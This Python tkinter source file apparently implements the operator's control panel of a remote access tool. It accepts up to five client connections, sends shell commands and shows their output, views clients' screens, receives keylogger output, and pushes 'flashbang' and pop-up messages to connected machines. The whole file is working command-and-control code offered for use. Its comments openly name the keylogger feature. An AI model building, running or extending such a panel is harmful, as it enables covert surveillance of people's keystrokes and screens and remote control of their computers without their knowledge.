import tkinter as objTK
from tkinter import filedialog
from tkinter import ttk as objTTK
import dialogueBoxTTK as objDialog
from tkinter import messagebox as objMessageBox
from tkextrafont import Font
import sv_ttk
import ctypes
from PIL import Image, ImageTk, UnidentifiedImageError
import io
import threading
import socket
import sys

connectionsNum = 0
clients = ["No Client Connected"] * 5
client_labels = [None] * 5
connectionNumThing = str(connectionsNum) + " Connections!"
client_sockets = [None] * 5


# ----------------------------------------------------------------
# The Variable Guide!
# Since there are a lot of variables, I will list a few of them and their purpose here.
# connectionsNum - number of connections, used in the UI
# client_sockets - list of client sockets, this is now used to store the image sockets of clients
# clients - a string, used in the CAMS system to check for empty slots
# client_labels - labels used to show the slots of clients, used in the UI
# current_client - an integer used in the screen veiw system, to keep track of the screen veiw and to scroll through each client screen.
# ----------------------------------------------------------------
class CustomCommandPrompt:
    # ----------------------------------------------------------------
    # The Remote CMD Class
    # This class is the UI and fucntional parts of the command prompt
    # Currently it only has the UI elements and "some" functionality, the rest are in the actual socket class.
    # ----------------------------------------------------------------
    def __init__(self, master):
        self.frame = objTK.Frame(
            master, bg="#252525", bd=2, highlightthickness=0, borderwidth=0
        )
        self.frame.place(relx=0.5, rely=0.5, anchor=objTK.CENTER, width=870, height=525)

        self.output_text = objTK.Text(
            self.frame,
            font=terminalFont,
            bg="#252525",
            fg="#fff",
            state="disabled",
            highlightthickness=0,
            borderwidth=0,
            padx=15,
            pady=15,
        )
        self.output_text.place(relwidth=1, relheight=0.929)

        self.command_entry = objTTK.Entry(self.frame, font=smallFont)
        self.command_entry.place(relx=0, rely=0.90, relheight=0.1, relwidth=0.7)
        self.command_entry.bind("<Return>", self.display_command)

        self.index = 0

        self.switchClientButtonTerminal = objTTK.Button(
            self.frame, text="Switch Client", command=self.changeTerminalClientIndex
        )
        self.switchClientButtonTerminal.place(
            relx=0.7, rely=0.90, relwidth=0.3, relheight=0.1
        )
        self.commandTerminal = None

    def changeTerminalClientIndex(self):
        self.index += 1
        if self.index >= len(server.client_sockets):
            self.index = 0
        self.output_text.config(state="normal")
        self.output_text.delete(1.0, objTK.END)
        self.output_text.insert(objTK.END, f"! Changed to Client {self.index + 1}\n")
        self.output_text.config(state="disabled")
        self.output_text.yview_moveto(1.0)
        self.command_entry.focus()

    def display_command(self, event):
        self.output_text.config(state="normal")
        self.commandTerminal = self.command_entry.get()
        cmdSend = "CMD" + self.commandTerminal
        if server.client_sockets[self.index] == None and self.index != 0:
            self.output_text.insert(
                objTK.END,
                f"Error: Client {self.index + 1} is not connected or has disconnected. Switching back to Client 1\n",
            )
            self.index = 0
            return
        elif server.client_sockets[self.index] == None and self.index == 0:
            self.output_text.insert(
                objTK.END,
                f"Error: There are no active/connected client or there is an issue with the Client Address Management System (CAMS). Check if there are any connected clients, if there is and it is not in the first array, report the issue in Github. \n",
            )
            self.index = 0
            return
        input = server.client_sockets[self.index].send(cmdSend.encode("utf-8"))


class ScreenSharingServer:
    # ----------------------------------------------------------------
    # The Literal Brain of the Project
    # This class is responsible for managing the server, accepting new connections, and managing the client sockets.
    # It also manages the screen sharing feature and the keylogger feature.
    # I couldn't be bothered to write out what each function does, because this class is fucking massive, and has a shit-ton of functions, tbh the functions are named properly so you can infer what they do from their names
    # ----------------------------------------------------------------
    def __init__(self, master, host="0.0.0.0", port=5001):
        self.master = master
        self.host = host
        self.port = port

        # Set up server socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((host, port))
        self.server_socket.listen(5)
        # Variables
        self.clients = [None] * 5
        self.client_sockets = [None] * 5
        self.client_labels = [None] * 5
        self.connectionNumThing = str(connectionsNum) + " Connections!"
        self.current_client = 0
        self.is_screen_sharing = True
        self.client_infos = [{}] * 5
        self.current_info_index = 0
        # UI elements
        self.canvas = objTK.Canvas(master, bg="black")
        self.canvas.pack(fill=objTK.BOTH, expand=True)

        self.prev_button = objTTK.Button(
            master, text="Previous", command=self.prev_client, width=20
        )
        self.prev_button.pack(padx=5, pady=5, side=objTK.LEFT)

        self.next_button = objTTK.Button(
            master, text="Next", command=self.next_client, width=20
        )
        self.next_button.pack(padx=5, pady=5, side=objTK.RIGHT)

        # General Commands tab
        self.flashbangLabel = objTTK.Label(
            objSettingsTab5, text="FLASHBANG! the client!", font=normalFont
        )
        self.flashbangLabel.place(x=20, y=20)
        self.flashBang = objTTK.Button(
            objSettingsTab5, text="FLASHBANG!", command=self.trigger_flashbang
        )
        self.flashBang.place(x=30, y=50)
        self.messageTheClientLabel = objTTK.Label(
            objSettingsTab5, text="Message the Client!", font=normalFont
        )
        self.messageTheClientLabel.place(x=20, y=100)
        self.messageTheClientButton = objTTK.Button(
            objSettingsTab5, text="Message!", command=self.message_client
        )
        self.messageTheClientButton.place(x=30, y=130)
        self.screenShareLabelButton = objTTK.Label(
            objSettingsTab5, text="Screenshare Control!", font=normalFont
        )
        self.screenShareLabelButton.place(x=20, y=180)
        self.screenShareStart = objTTK.Button(
            objSettingsTab5, text="Start Screenshare", command=self.startScreenShare
        )
        self.screenShareStart.place(x=30, y=210)
        self.screenShareStop = objTTK.Button(
            objSettingsTab5, text="Stop Screenshare", command=self.stopScreenShare
        )
        self.screenShareStop.place(x=30, y=250)
        # LET THE NIGHTMARE BEGINNNNNN
        self.wait_for_connection()

    def wait_for_connection(self):
        threading.Thread(target=self.accept_connection).start()

    # The CAMS system, this accepts connections, manages them, organizes them into a list, starts the screenshare thread, etc'
    def accept_connection(self):
        global connectionsNum
        print("Waiting for a connection...")
        try:
            while True:
                client_socket, address = self.server_socket.accept()
                print(f"Connection from {address} has been established!")

                empty_slot = None
                for i in range(5):
                    if (
                        self.client_sockets[i] is None
                        or self.clients[i] == "Client Disconnected"
                    ):
                        empty_slot = i
                        break

                if empty_slot is not None:
                    self.clients[empty_slot] = address[0]
                    self.client_sockets[empty_slot] = client_socket
                    connectionsNum += 1
                    self.update_client_labels(
                        empty_slot, address[0], "No IPv6", connectionsNum
                    )
                    threading.Thread(
                        target=self.receive_data, args=(client_socket, empty_slot)
                    ).start()
                else:
                    print("No available slots for new connections.")
        except OSError as e:
            print(f"Error: {e}")
            self.disconnect()

    # Handles the client communication, this is the reason this program only uses one socket, took me way too long to make
    def receive_data(self, client_socket, index):
        try:
            while True:
                header = client_socket.recv(1)
                if not header:
                    raise ConnectionError("Client disconnected")

                if header == b"I":  # 'I' means image data is coming
                    self.receive_image(client_socket, index)
                elif header == b"C":  # 'C' means command data is coming
                    self.receive_command(client_socket, index)
                elif header == b"L":  # 'L' means logger data is coming
                    self.receive_logger(client_socket, index)
        except (ConnectionError, OSError) as e:
            print(f"Error: {e}")
            self.handle_client_disconnection(index)

    # NO this doesn't update the canvas, this RECEIVES the images and gives it to the next function
    def receive_image(self, client_socket, index):
        try:
            size_data = client_socket.recv(4)
            if not size_data:
                raise ConnectionError("Client disconnected")
            size = int.from_bytes(size_data, "big")

            data = b""
            while len(data) < size:
                packet = client_socket.recv(min(4096, size - len(data)))
                if not packet:
                    raise ConnectionError("Client disconnected")
                data += packet

            if len(data) < size:
                raise ConnectionError("Incomplete data received")
            while True:
                try:
                    image = Image.open(io.BytesIO(data))
                    if index == self.current_client:
                        self.update_image(image)
                        break
                except UnidentifiedImageError:
                    print("Received data is not a valid image")
                    continue
        except (ConnectionError, OSError) as e:
            print(f"Error receiving image: {e}")
            self.handle_client_disconnection(index)

    # Handles the commands, mainly the terminal outputs sent by the client(s).
    def receive_command(self, client_socket, index):
        try:
            while True:
                lenght = 0
                digits = client_socket.recv(1).decode("utf-8")
                while digits.isdigit():
                    lenght = lenght * 10 + int(digits)
                    digits = client_socket.recv(1).decode("utf-8")
                break
            commandClient = client_socket.recv(lenght + 8).decode("utf-8")
            if index == terminal.index and commandClient.startswith("[CMDOUT]"):
                terminal.output_text.config(state="normal")
                print_output = commandClient[8:]
                terminal.output_text.insert(
                    objTK.END, f"$ {terminal.commandTerminal}\n"
                )
                terminal.output_text.insert(objTK.END, f"{print_output}\n")
                terminal.command_entry.delete(0, objTK.END)
                terminal.output_text.config(state="disabled")
                terminal.output_text.yview_moveto(1.0)

        except (ConnectionError, OSError) as e:
            print(f"Error receiving command: {e}")
            self.handle_client_disconnection(index)
        except UnicodeDecodeError as e:
            print(f"Decoding error: {e}")

    # This handles the logs sent by the client(s)
    def receive_logger(self, client_socket, index):
        try:
            try:
                while True:
                    lenght = 0
                    digits = client_socket.recv(1).decode("utf-8")
                    while digits.isdigit():
                        lenght = lenght * 10 + int(digits)
                        digits = client_socket.recv(1).decode("utf-8")
                    break
                logClient = client_socket.recv(lenght + 5).decode("utf-8")
                if logClient.startswith("[LOG]"):
                    trimmedLog = logClient[5:]
                    print(f"Received log from Client {index}: \n{trimmedLog}")
            except UnicodeDecodeError:
                pass
        except (ConnectionError, OSError) as e:
            print(f"Error receiving command: {e}")
            self.handle_client_disconnection(index)

    # THIS updates the canvas, the receive image function gives the processed data to it for this to handle.
    def update_image(self, image):
        try:
            canvas_width = self.canvas.winfo_width()
            canvas_height = self.canvas.winfo_height()

            if canvas_width <= 0 or canvas_height <= 0:
                return

            img_width, img_height = image.size
            img_ratio = img_width / img_height
            canvas_ratio = canvas_width / canvas_height

            if img_ratio > canvas_ratio:
                new_width = canvas_width
                new_height = int(canvas_width / img_ratio)
            else:
                new_height = canvas_height
                new_width = int(canvas_height * img_ratio)

            if new_width <= 0 or new_height <= 0:
                return

            resized_image = image.resize((new_width, new_height), Image.LANCZOS)
            photo = ImageTk.PhotoImage(resized_image)

            self.canvas.create_image(
                (canvas_width - new_width) // 2,
                (canvas_height - new_height) // 2,
                anchor=objTK.NW,
                image=photo,
            )
            self.canvas.image = photo
        except Exception as e:
            print(f"Error updating image: {e}")

    # Screenshare Veiw Management Functions
    def next_client(self):
        while self.canvas.image is not None:
            self.canvas.image = None
        self.current_client = (self.current_client + 1) % 5
        self.update_client_view()

    def prev_client(self):
        while self.canvas.image is not None:
            self.canvas.image = None
        self.current_client = (self.current_client - 1) % 5
        self.update_client_view()

    def update_client_view(self):
        print(f"Switched to client {self.current_client + 1}")

    # "Gracefully" handles client disconnection
    def handle_client_disconnection(self, index):
        global connectionsNum, clients, client_sockets
        if self.client_sockets[index]:
            self.client_sockets[index].close()
            self.client_sockets[index] = None
        self.clients[index] = "Client Disconnected"
        connectionsNum -= 1
        if connectionsNum < 0:
            connectionsNum = 0
        self.update_client_labels(
            index, "Client Disconnected", "Client Disconnected", connectionsNum
        )

    def disconnect(self):
        for sock in self.client_sockets:
            if sock:
                sock.close()
        self.is_screen_sharing = False

    # This is for the UI, this updates the text displayed in the Home tab
    def update_client_labels(self, index, ipv4, ipv6, num):
        connectionNumThing.config(text=f"{num} Connections!")
        if ipv4 != "Client Disconnected":
            client_labels[index].config(text=f"IPv4: {ipv4} | IPv6: {ipv6}")
        else:
            client_labels[index].config(text="Client Disconnected")

    # FLASHBANG! function
    def trigger_flashbang(self):
        clientToFlashbang = objDialog.askinteger(
            title="FLASHBANG!",
            prompt="Choose the client to FLASHBANG!. The first client value is 0, and the fifth client value is 4",
        )
        if clientToFlashbang is not None:
            client_socket_Selec = self.client_sockets[clientToFlashbang]
            if client_socket_Selec is not None:
                client_socket_Selec.send("flashbang".encode("utf-8"))

    # Messages a client
    def message_client(self):
        clientToMessage = objDialog.askinteger(
            title="Message the Client!",
            prompt="Choose the client to send a message! The first client value is 0, and the fifth client value is 4",
        )
        if clientToMessage is not None:
            client_socket_Selec = self.client_sockets[clientToMessage]
            if client_socket_Selec is not None:
                message = objDialog.askstring(
                    title="Message the Client!", prompt="Enter the message to send!"
                )
                messageToSend = f"message{message}"
                client_socket_Selec.send(messageToSend.encode("utf-8"))

    # Screenshare Controls
    def startScreenShare(self):
        clientToStartScreenShare = objDialog.askinteger(
            title="Screenshare Start!",
            prompt="Choose the client to start their Screenshare. The first client value is 0, and the fifth client value is 4",
        )
        if clientToStartScreenShare is not None:
            if self.client_sockets[clientToStartScreenShare] is not None:
                self.client_sockets[clientToStartScreenShare].send(
                    "start_screenshare".encode("utf-8")
                )

    def stopScreenShare(self):
        clientToStopScreenShare = objDialog.askinteger(
            title="Screenshare Stop!",
            prompt="Choose the client to stop their Screenshare. The first client value is 0, and the fifth client value is 4",
        )
        if clientToStopScreenShare is not None:
            if self.client_sockets[clientToStopScreenShare] is not None:
                self.client_sockets[clientToStopScreenShare].send(
                    "stop_screenshare".encode("utf-8")
                )


# This makes the UI more CRISP!
try:
    ctypes.windll.shcore.SetProcessDpiAwareness(1)
except Exception as e:
    print(f"Failed to set DPI awareness: {e}")
# Tkinter shit
root = objTK.Tk()
root.title("Server Side Control Panel")
root.geometry("905x610")
root.resizable(width=False, height=False)
if sys.platform == "win32":
    root.iconbitmap("test/Images/icon.ico")
path = "test/Fonts/font.ttf"
path2 = "test/Fonts/font2.ttf"
path3 = "test/Fonts/font3.otf"
# Fonts
normalFont = Font(file=path, family="Montserrat", size=10)
smallFont = Font(file=path3, family="Cascadia Mono Light", size=8)
terminalFont = Font(family="Cascadia Mono Light", size=8)
boldFont = Font(family="Montserrat Semibold", size=20)
lightFont = Font(family="Montserrat Light", size=10)


# Theme toggle function
def toggle_theme():
    if sv_ttk.get_theme() == "dark":
        themeToggle.config(text="Dark Mode")
        sv_ttk.use_light_theme()
    else:
        themeToggle.config(text="Light Mode")
        sv_ttk.use_dark_theme()
    apply_focus_style()
    style.configure("TButton", font=normalFont)


# Theme
sv_ttk.set_theme("dark")
style = objTTK.Style()
# Some "MAGICAL SHIT" with the button and tab styles
style.configure("TButton", font=lightFont)
style.map("TButton", font=[("disabled", ("Montserrat", 10, "bold"))])
style.layout(
    "TNotebook.Tab",
    [
        (
            "Notebook.tab",
            {
                "sticky": "nswe",
                "children": [
                    (
                        "Notebook.padding",
                        {
                            "side": "top",
                            "sticky": "nswe",
                            "children": [("Notebook.label", {"sticky": "nswe"})],
                        },
                    )
                ],
            },
        )
    ],
)
# Makes tabs
tabControl = objTTK.Notebook(root, width=887, height=547)
# Add tabs
objHomeTab = objTTK.Frame(tabControl)
objSettingsTab1 = objTTK.Frame(tabControl)
objSettingsTab2 = objTTK.Frame(tabControl)
objSettingsTab3 = objTTK.Frame(tabControl)
objSettingsTab4 = objTTK.Frame(tabControl)
objSettingsTab5 = objTTK.Frame(tabControl)
# Name tabs
tabControl.add(objHomeTab, text="Home")
tabControl.add(objSettingsTab1, text="Remote CMD")
tabControl.add(objSettingsTab2, text="Screen View")
tabControl.add(objSettingsTab3, text="File Uploader")
tabControl.add(objSettingsTab4, text="File Downloader")
tabControl.add(objSettingsTab5, text="General Commands")
# Initialize the classes
server = ScreenSharingServer(objSettingsTab2)
terminal = CustomCommandPrompt(objSettingsTab1)


# Some tweaks to make the theme toggle a lil nicer
def apply_focus_style():
    if sv_ttk.get_theme() == "dark":
        focus_bg = "#333333"
        server.canvas.config(bg="#000000")
        terminal.frame.config(bg="#252525")
        terminal.output_text.config(bg="#252525")
        terminal.output_text.config(fg="#efefef")
    else:
        focus_bg = "#FFFFFF"
        server.canvas.config(bg="#FFFFFF")
        terminal.frame.config(bg="#F5F5F5")
        terminal.output_text.config(bg="#F5F5F5")
        terminal.output_text.config(fg="#333333")

    style.map("TNotebook.Tab", focuscolor=[("!focus", focus_bg), ("focus", focus_bg)])
    style.configure("TNotebook.Tab", font=lightFont)


# Call Function
apply_focus_style()
# Add shit to the tabs
# Home Tab
themeLabel = objTTK.Label(
    objHomeTab, text="Toggle between Light and Dark theme:", font=normalFont
)
themeLabel.place(x=20, y=20)
themeToggle = objTTK.Button(objHomeTab, text="Toggle theme", command=toggle_theme)
themeToggle.place(x=30, y=50)

heading = objTTK.Label(objHomeTab, text="Connections", font=boldFont)
heading.place(x=20, y=100)

connections = objTTK.Label(
    objHomeTab, text=str(connectionsNum) + " Connections!", font=normalFont
)
connections.place(x=20, y=140)
connectionNumThing = connections

connections1_label = objTTK.Label(objHomeTab, text=clients[0], font=normalFont)
connections1_label.place(x=40, y=170)
client_labels[0] = connections1_label

connections2_label = objTTK.Label(objHomeTab, text=clients[1], font=normalFont)
connections2_label.place(x=40, y=200)
client_labels[1] = connections2_label

connections3_label = objTTK.Label(objHomeTab, text=clients[2], font=normalFont)
connections3_label.place(x=40, y=230)
client_labels[2] = connections3_label

connections4_label = objTTK.Label(objHomeTab, text=clients[3], font=normalFont)
connections4_label.place(x=40, y=260)
client_labels[3] = connections4_label

connections5_label = objTTK.Label(objHomeTab, text=clients[4], font=normalFont)
client_labels[4] = connections5_label
connections5_label.place(x=40, y=290)


# File Uploader tab
def fileUploader():
    file_path = objTK.filedialog.askopenfilename()
    if file_path:
        with open(file_path, "rb") as file:
            file_data = file.read()
        print(f"File Contents: {file_data} \nFile Size: {len(file_data)}")


fileLabel = objTTK.Label(objSettingsTab3, text="Select File:", font=normalFont)
fileLabel.place(x=20, y=20)
uploadButton = objTTK.Button(objSettingsTab3, text="Upload", command=fileUploader)
uploadButton.place(x=30, y=50)
fileEntryLabel = objTTK.Label(
    objSettingsTab3,
    text="Enter Destination Location, (Location on Client PC):",
    font=normalFont,
)
fileEntryLabel.place(x=20, y=100)
locationClientEntry = objTTK.Entry(objSettingsTab3, font=smallFont, width=80)
locationClientEntry.place(x=30, y=130)

# File Downloader tab
lb5 = objTTK.Label(objSettingsTab4, text="Placeholder 4", font=normalFont)
lb5.place(x=20, y=20)


# Center the main notebook
def center_widget(widget):
    widget.place(relx=0.5, rely=0.5, anchor="center")


import ctypes


# "Gracefully" closes the window
def shutDown():
    if objMessageBox.askyesno(
        title="WARNING",
        message="Are you sure you want to shut down? This will close the connection between the client and the server. You will not be able to reconnect unless the client program is opened manually along with the server.",
    ):
        if objMessageBox.askyesno(
            title="LAST WARNING", message="Are you really sure?!"
        ):
            for sock in server.client_sockets:
                if sock is not None:
                    sock.close()
                else:
                    continue
            server.server_socket.close()
            root.destroy()


# Calls function, another one
center_widget(tabControl)
# The end of the code, allows the tkinter window to exist
root.protocol("WM_DELETE_WINDOW", shutDown)
root.mainloop()
